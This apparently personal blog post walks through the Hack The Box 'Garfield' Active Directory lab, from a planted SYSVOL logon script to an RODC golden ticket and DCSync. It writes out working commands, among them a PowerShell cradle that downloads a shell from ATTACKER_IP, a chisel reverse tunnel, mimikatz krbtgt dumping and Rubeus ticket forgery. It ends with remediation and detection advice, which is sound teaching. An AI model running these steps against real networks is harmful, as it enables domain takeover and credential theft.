---
title: "HTB Garfield — from a logon script to an RODC golden ticket"
date: 2026-05-26
platform: Hack The Box
difficulty: Hard
os: Windows
category: Offense
summary: "An assume-breach Active Directory box: an attribute-level ACL that BloodHound doesn't show, RBCD into a read-only domain controller, and a Password Replication Policy abused to forge a ticket the primary DC accepts."
tags: [active-directory, rodc, rbcd, golden-ticket, bloodyad, impacket, rubeus, chisel, kerberos]
---

Garfield is an assume-breach Active Directory box with two domain controllers: `DC01`, the writable DC you can reach, and `RODC01`, a read-only domain controller on an internal subnet. The chain runs through six distinct techniques, and the starting point is a single attribute write that BloodHound never surfaced. This one taught me more about Kerberos than anything before it, mostly through things going wrong.

**Attack path**

1. `scriptPath` write on a user → logon script in SYSVOL → shell as `l.wilson`
2. `ForceChangePassword` ACE → reset `l.wilson_adm` → WinRM on DC01
3. Write on `msDS-AllowedToActOnBehalfOfOtherIdentity` → RBCD → SYSTEM on RODC01
4. Dump the RODC's own `krbtgt_8245` key material
5. Modify the RODC's Password Replication Policy to allow caching Administrator
6. Forge an RODC golden ticket, request a TGS from DC01, DCSync → domain admin

## Enumeration

```
53/tcp   domain          445/tcp  microsoft-ds    3389/tcp ms-wbt-server
88/tcp   kerberos-sec    636/tcp  ldapssl         5985/tcp wsman
135/tcp  msrpc           2179/tcp vmrdp           9389/tcp adws
139/tcp  netbios-ssn
```

Full DC fingerprint, WinRM open, and about eight hours of clock skew — which matters later.

With the provided `j.arbuckle` credentials:

```bash
netexec smb DC01 -u j.arbuckle -p '<provided>' --users
netexec smb DC01 -u j.arbuckle -p '<provided>' --shares
bloodhound-python -d garfield.htb -u j.arbuckle -p '<provided>' -ns DC01 -c All
```

Users of interest: `l.wilson` (standard), `l.wilson_adm` (member of Remote Management Users), `administrator`, and `krbtgt_8245` — the RODC's dedicated krbtgt account. `RODC01` resolved to `192.168.100.2`, not routable from my position.

BloodHound showed no path from `j.arbuckle` to anything useful. The path only appeared with manual ACL enumeration:

```bash
bloodyAD -d garfield.htb -u j.arbuckle -p '<provided>' --host DC01 get writable
```

- IT Support (my group) has `WriteProperty` on `scriptPath` for `l.wilson` and `l.wilson_adm`
- `l.wilson` has `ForceChangePassword` over `l.wilson_adm`
- `l.wilson_adm` has write on `msDS-AllowedToActOnBehalfOfOtherIdentity` for `RODC01$`

## Foothold — logon script abuse

`scriptPath` points at a file in SYSVOL's `scripts` folder, and that folder was writable by domain users. So: drop a batch file that pulls and runs a PowerShell reverse shell, point `l.wilson`'s logon script at it, wait for the simulated logon.

```bash
PAYLOAD="IEX(New-Object Net.WebClient).downloadString('http://ATTACKER_IP:8000/shell.ps1')"
ENCODED=$(echo -n "$PAYLOAD" | iconv -t UTF-16LE | base64 -w0)
printf '@echo off\r\npowershell -nop -w hidden -enc %s\r\n' "$ENCODED" > printerDetect.bat

smbclient //DC01/SYSVOL -U 'j.arbuckle%<provided>' \
  -c 'cd garfield.htb\scripts; put printerDetect.bat'

bloodyAD -d garfield.htb -u j.arbuckle -p '<provided>' --host DC01 \
  set object l.wilson scriptPath -v 'printerDetect.bat'
```

Shell as `garfield\l.wilson`.

## Lateral movement — ForceChangePassword

```powershell
Set-ADAccountPassword -Identity l.wilson_adm -NewPassword (ConvertTo-SecureString '<new>' -AsPlainText -Force) -Reset
```

```bash
evil-winrm -i DC01 -u l.wilson_adm -p '<new>'
```

WinRM shell as `l.wilson_adm`. User flag.

## Privilege escalation — RBCD into the RODC

Write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` on `RODC01$` means Resource-Based Constrained Delegation: I can tell RODC01 to trust a machine account I control to impersonate users to it.

```bash
impacket-addcomputer garfield.htb/j.arbuckle:'<provided>' -dc-ip DC01 \
  -computer-name 'FAKEBOX$' -computer-pass '<pass>'

bloodyAD -d garfield.htb -u l.wilson_adm -p '<new>' --host DC01 add rbcd 'RODC01$' 'FAKEBOX$'
```

RODC01 is on an internal subnet, so a SOCKS tunnel through DC01:

```bash
# attack box
chisel server -p 8001 --reverse
# DC01 (evil-winrm)
.\chisel.exe client ATTACKER_IP:8001 R:socks
```

Then — clock sync first, every time — a service ticket impersonating Administrator to RODC01, and PSExec through the proxy:

```bash
sudo ntpdate -b DC01
proxychains impacket-getST garfield.htb/'FAKEBOX$':'<pass>' \
  -spn cifs/RODC01.garfield.htb -impersonate Administrator -dc-ip DC01
export KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
proxychains impacket-psexec garfield.htb/Administrator@RODC01.garfield.htb \
  -k -no-pass -dc-ip DC01 -target-ip 192.168.100.2
```

SYSTEM on RODC01.

## Dumping the RODC's krbtgt

A read-only DC has its own krbtgt account (`krbtgt_<number>`) whose key signs tickets the RODC issues. With SYSTEM:

```
mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245" "exit"
```

Both the NT hash and the **AES256 key** came out. The AES key is the one that matters — an RODC golden ticket forged from the NT hash alone is rejected.

## Domain compromise — the RODC golden ticket

An RODC can only cache credentials for accounts its Password Replication Policy allows. By default Domain Admins are in the deny list (`msDS-NeverRevealGroup`). The plan: clear the deny list, put Administrator in the allow list (`msDS-RevealOnDemandGroup`), forge a TGT with the RODC's key for Administrator, and ask DC01 for a service ticket with it.

Writing the PRP attributes needs membership in `RODC Administrators`, which `l.wilson_adm` could grant herself:

```powershell
Add-ADGroupMember -Identity "RODC Administrators" -Members "l.wilson_adm"
```

```bash
# Deny list first — denied entries always override allowed ones
bloodyAD -d garfield.htb -u l.wilson_adm -p '<new>' --host DC01 \
  set object 'RODC01$' msDS-NeverRevealGroup \
  -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb'

bloodyAD -d garfield.htb -u l.wilson_adm -p '<new>' --host DC01 \
  set object 'RODC01$' msDS-RevealOnDemandGroup \
  -v 'CN=Administrator,CN=Users,DC=garfield,DC=htb'
```

Forge the ticket on RODC01 with Rubeus — **v2.3.3 or later**; v2.2.0 has a PAC-signing bug that produces tickets DC01 rejects with `KRB_AP_ERR_BAD_INTEGRITY`:

```
Rubeus.exe golden /rodcNumber:8245 /aes256:<krbtgt_8245 aes256> ^
  /user:Administrator /id:500 /domain:garfield.htb /sid:<domain SID> /outfile:rodc_golden.kirbi

Rubeus.exe asktgs /ticket:rodc_golden.kirbi /service:cifs/DC01.garfield.htb /dc:DC01.garfield.htb /nowrap
```

Back on the attack box, convert and use the TGS for DCSync:

```bash
sudo ntpdate -b DC01
echo "<base64 TGS>" | base64 -d > tgs.kirbi
impacket-ticketConverter tgs.kirbi tgs.ccache
export KRB5CCNAME=tgs.ccache
impacket-secretsdump -k -no-pass garfield.htb/Administrator@DC01.garfield.htb -just-dc-user Administrator
evil-winrm -i DC01 -u Administrator -H <NT hash>
```

Domain fully compromised. Root flag.

## Mistakes I made

1. **Not testing SYSVOL write access early.** I spent hours on AS-REP roasting, Kerberoasting and spraying when a single `put` would have shown the foothold. Share-level read doesn't tell you the NTFS permissions underneath.
2. **A stale `KRB5CCNAME`.** After deleting old ccache files the variable still pointed at one, and `getST` failed in ways that looked like auth errors. `unset KRB5CCNAME` before generating new tickets.
3. **Clock drift.** `ntpdate` syncs once; systemd drifts it back. Sync immediately before every Kerberos operation, or point NTP at the DC.
4. **Rubeus v2.2.0.** The ticket looked right and DC01 rejected it. I questioned the key material and the PRP for a long time before questioning the tool.
5. **Allow list before deny list.** With Domain Admins still in `msDS-NeverRevealGroup`, adding Administrator to the allow list produced `KDC_ERR_TGT_REVOKED`. Deny wins.
6. **Chisel state.** Killing the client with Ctrl+C in evil-winrm left a stale tunnel that caused persistent `STATUS_MORE_PROCESSING_REQUIRED` errors. Stop it properly from another session (`Get-Process chisel | Stop-Process -Force`).
7. **Kerberos over SOCKS.** The multi-step SMB negotiation is fragile through a proxy. A fresh tunnel and `getST` → `psexec` back to back was the only reliable sequence.
8. **Trusting BloodHound as complete.** It doesn't enumerate attribute-level DACLs like `scriptPath`. Supplement it with `bloodyAD get writable` or `impacket-dacledit`.

## MITRE ATT&CK

| Technique | ID |
|---|---|
| Valid Accounts | T1078 |
| Domain Account / Group Discovery | T1087.002, T1069.002 |
| Boot or Logon Initialization Scripts: Network Logon Script | T1037.003 |
| Account Manipulation | T1098 |
| Resource-Based Constrained Delegation abuse | T1548 |
| Proxy (SOCKS via Chisel) | T1090 |
| Pass the Ticket | T1550.003 |
| OS Credential Dumping: LSA Secrets | T1003.004 |
| Steal or Forge Kerberos Tickets: Golden Ticket | T1558.001 |
| OS Credential Dumping: DCSync | T1003.006 |

## Remediation

- Remove `WriteProperty` on `scriptPath`, `homeDirectory` and `profilePath` from non-admin groups, and audit SYSVOL NTFS permissions so only SYSTEM, Domain Admins and Group Policy Creator Owners can write.
- Keep Tier 0 accounts explicitly in the RODC deny list and restrict `RODC Administrators` membership; alert on changes to `msDS-RevealOnDemandGroup` / `msDS-NeverRevealGroup`.
- Alert on writes to `msDS-AllowedToActOnBehalfOfOtherIdentity`.
- Set `ms-DS-MachineAccountQuota` to 0 so standard users can't create machine accounts.
- Separate a person's standard and admin accounts fully — no ACE relationships between tiers.
- Microsoft Defender for Identity can flag tickets signed with an RODC key being used against a writable DC.

*All techniques performed against a private Hack The Box lab instance.*
